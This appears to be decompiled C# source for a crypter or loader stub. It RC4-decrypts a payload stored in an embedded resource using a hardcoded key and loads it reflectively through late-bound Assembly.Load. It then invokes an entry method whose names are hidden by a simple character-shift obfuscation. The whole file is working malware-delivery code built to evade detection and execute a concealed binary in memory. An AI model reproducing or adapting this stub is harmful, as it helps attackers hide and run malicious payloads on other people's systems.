using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using h65ur6.My.Resources;

namespace h65ur6;

[StandardModule]
internal sealed class lP2Chk
{
	private static byte[] zbXxA = Encoding.Default.GetBytes(Resources.edfgse);

	private static Assembly p6z6EaY;

	static lP2Chk()
	{
		Type typeFromHandle = typeof(Assembly);
		string text = KFzIxJoe("Lpcg");
		object[] array = new object[1];
		byte[] wcMzM = zbXxA;
		array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(LwIrl(ref wcMzM))));
		p6z6EaY = (Assembly)NewLateBinding.LateGet((object)null, typeFromHandle, text, array, (string[])null, (Type[])null, (bool[])null);
	}

	public static string KFzIxJoe(string sWPbQmsd)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(sWPbQmsd);
		int num = bytes.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			if (bytes[i] > 31 && bytes[i] < 127)
			{
				byte[] array = bytes;
				int num2 = i;
				array[num2] = (byte)(array[num2] - Convert.ToByte(i % 31 + 0));
			}
			if (bytes[i] < 32)
			{
				bytes[i] = Convert.ToByte(bytes[i] + 95);
			}
		}
		return Encoding.UTF8.GetString(bytes);
	}

	public static object LwIrl(ref byte[] wcMzM)
	{
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int length = wcMzM.GetLength(Convert.ToInt32(0));
		int num = Convert.ToInt32(array.GetLength(Convert.ToInt32(0)));
		int num2 = 0;
		do
		{
			array2[num2] = (byte)num2;
			array3[num2] = array[num2 % num];
			num2++;
		}
		while (num2 <= 255);
		int num3 = Convert.ToInt32(0);
		num2 = 0;
		do
		{
			num3 = Convert.ToInt32((num3 + array2[num2] + array3[num2]) % 256);
			byte b = array2[num2];
			array2[num2] = array2[num3];
			array2[num3] = b;
			num2++;
		}
		while (num2 <= 255);
		num3 = Convert.ToInt32(0);
		num2 = num3;
		int num4 = length - 1;
		for (int i = 0; i <= num4; i++)
		{
			num2 = Convert.ToInt32((num2 + 1) % 256);
			num3 = Convert.ToInt32((num3 + array2[num2]) % 256);
			byte b = array2[num2];
			array2[num2] = array2[num3];
			array2[num3] = b;
			int num5 = Convert.ToInt32((Convert.ToInt32(array2[num2]) + array2[num3]) % 256);
			wcMzM[i] = (byte)(wcMzM[i] ^ array2[num5]);
		}
		return wcMzM;
	}

	[STAThread]
	public static void main()
	{
		p6z6EaY.GetType(KFzIxJoe("nfggii4Jtj}~="))!.InvokeMember(KFzIxJoe("CbnoQj"), BindingFlags.InvokeMethod, null, null, null);
	}
}
